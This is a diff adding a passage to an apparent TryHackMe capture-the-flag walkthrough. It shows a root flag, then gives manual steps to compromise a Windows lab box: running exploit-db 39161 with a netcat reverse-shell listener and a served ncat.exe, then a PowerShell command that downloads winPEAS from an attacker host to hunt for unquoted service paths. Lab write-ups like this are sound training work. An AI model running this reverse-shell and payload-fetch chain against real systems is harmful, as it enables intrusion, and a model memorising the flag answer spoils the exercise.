@@ -285,3 +285,68 @@ Successfully captured the flag.
 Question 2: What is the root flag?
 
 `9af5f314f57607c00fd09803a587db80`
+
+#
+
+# Access and Escalation Without Metasploit Question
+
+Question 1: What powershell -c command could we run to manually find out the service name?
+
+*Format is "powershell -c "command here"*
+
+#
+
+# Question 1
+
+Download the exploit
+- Copy the raw text from: https://www.exploit-db.com/raw/39161
+- into a new file called it exploit.py.
+
+Edit the port/ip in the script
+- Edit the script and add your attacker machine ip. You can leave the ip as is if you want.
+
+Edit the port number in the script for the file server
+- The payload script uses port 80 for the file web server by default. This port is often used on THM AttackBoxes and we can therefore not use it for the web server we run in step 5. We therefore add port 8000 to the ip_addr
+variable. See image below.
+
+Download a netcat static binary
+- Download the netcat binary here: https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
+- It need to be renamed to nc.exe to work with the exploit script.
+
+Serve the binary by running a Python webserver
+- In the directory where you have your binary running start a simple Python web server by running: python3 -m http.server 8000
+
+Start a listener
+- Start a simply netcat listener by entering nc -lvnp 443
+
+Run the exploit with the correct arguments
+- Run this command: python2 exploit.py 10.10.13.114 8080
+- This script will not work without editing with python3.
+
+Run the exploit once more
+
+<p align="center"> <img src="https://i.imgur.com/sbwiwlt.png" height="90%" width="90%" alt=""/>
+
+
+If you've followed the steps correctly, you should have three terminal tabs open. One is for running the exploit, another for the Python HTTP server, and the third for the Netcat listener.
+
+<p align="center"> <img src="https://i.imgur.com/AEva5Bb.png" height="90%" width="90%" alt=""/>
+
+Great job! We're moving on to the system now. Let's use PowerShell to fetch winPEAS. Start by getting the winPEAS binary from this link (https://github.com/carlospolop/PEASS-ng/releases/tag/20220717) and set up the Python server again. Go to Bill's desktop (details below). Once there, run the following command in the PowerShell shell:
+
+`powershell -c wget "http://<attacker ip>:8000/winPEAS.exe" -outfile "winPEAS.exe"`
+
+<p align="center"> <img src="https://i.imgur.com/TsRTNMz.png" height="90%" width="90%" alt=""/>
+
+After running winPeas (just type winPeas.exe), it shows us unquoted paths. It also reveals the name of the service it is currently running.
+
+<p align="center"> <img src="https://i.imgur.com/ZfTDiNX.png" height="90%" width="90%" alt=""/>
+
+We see the same vulnerability as we did when we used Metasploit.
+
+Question 1: What powershell -c command could we run to manually find out the service name? *Format is “powershell -c “command here”*
+
+`powershell -c Get-Service`
+
+
+
